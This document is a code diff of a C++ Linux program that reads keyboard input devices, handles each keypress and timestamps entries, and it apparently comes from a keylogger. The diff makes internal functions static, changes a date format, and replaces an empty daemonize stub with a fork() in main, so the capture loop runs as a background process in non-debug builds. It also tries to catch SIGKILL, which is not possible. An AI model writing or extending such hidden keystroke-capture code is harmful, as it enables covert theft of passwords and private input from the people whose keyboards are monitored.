@@ -33,13 +33,13 @@ struct key_event_handler_t {
   void (*cb)(x9kl_ctx_t *);
 };
 
-void handle_key(x9kl_ctx_t *);
-void handle_enter(x9kl_ctx_t *);
-void handle_backspace(x9kl_ctx_t *);
-void handle_capslock(x9kl_ctx_t *);
-void handle_delete(x9kl_ctx_t *);
-void handle_arrow(x9kl_ctx_t *);
-void handle_shift(x9kl_ctx_t *);
+static void handle_key(x9kl_ctx_t *);
+static void handle_enter(x9kl_ctx_t *);
+static void handle_backspace(x9kl_ctx_t *);
+static void handle_capslock(x9kl_ctx_t *);
+static void handle_delete(x9kl_ctx_t *);
+static void handle_arrow(x9kl_ctx_t *);
+static void handle_shift(x9kl_ctx_t *);
 
 volatile std::sig_atomic_t must_stop{0};
 
@@ -102,7 +102,7 @@ static const std::map<int, key_event_handler_t> handlers{
 
 void sig_handler(int sig_num) { must_stop = 1; }
 
-std::vector<std::string> get_event_files() {
+static std::vector<std::string> get_event_files(void) {
   std::vector<std::string> content;
 
   {
@@ -122,7 +122,7 @@ std::vector<std::string> get_event_files() {
   return content;
 }
 
-std::vector<int> get_keyboard_fds() {
+static std::vector<int> get_keyboard_fds(void) {
   std::vector<int> fds;
 
   for (auto &event : get_event_files()) {
@@ -136,7 +136,7 @@ std::vector<int> get_keyboard_fds() {
   return fds;
 }
 
-int initialize_ctx(x9kl_ctx_t *ctx) {
+static int initialize_ctx(x9kl_ctx_t *ctx) {
   if (!ctx) {
     return 1;
   }
@@ -156,7 +156,7 @@ int initialize_ctx(x9kl_ctx_t *ctx) {
   return 0;
 }
 
-void destroy_ctx(x9kl_ctx_t *ctx) {
+static void destroy_ctx(x9kl_ctx_t *ctx) {
   for (auto &fd : ctx->kb_fds) {
     close(fd);
   }
@@ -190,7 +190,7 @@ void handle_enter(x9kl_ctx_t *ctx) {
     auto now =
         std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
 
-    std::strftime(date, sizeof(date), "%d_%m_%Y", std::localtime(&now));
+    std::strftime(date, sizeof(date), "%d%m%Y", std::localtime(&now));
     std::strftime(timestamp, sizeof(timestamp), "%H:%M:%S",
                   std::localtime(&now));
   }
@@ -288,19 +288,26 @@ void run(x9kl_ctx_t *ctx) {
   }
 }
 
-void deamonize() {}
+int main(void) {
+#ifndef DEBUG
+  if (!fork()) {
+#endif  // DEBUG
+    x9kl_ctx_t ctx;
 
-int main() {
-  x9kl_ctx_t ctx;
+    if (initialize_ctx(&ctx)) {
+      std::exit(EXIT_FAILURE);
+    }
 
-  if (initialize_ctx(&ctx)) {
-    std::exit(EXIT_FAILURE);
+    std::signal(SIGINT, sig_handler);
+    std::signal(SIGKILL, sig_handler);
+    std::signal(SIGTERM, sig_handler);
+    std::signal(SIGQUIT, sig_handler);
+
+    run(&ctx);
+    destroy_ctx(&ctx);
+#ifndef DEBUG
   }
-
-  std::signal(SIGINT, sig_handler);
-
-  run(&ctx);
-  destroy_ctx(&ctx);
+#endif  // DEBUG
 
   std::exit(EXIT_SUCCESS);
 }
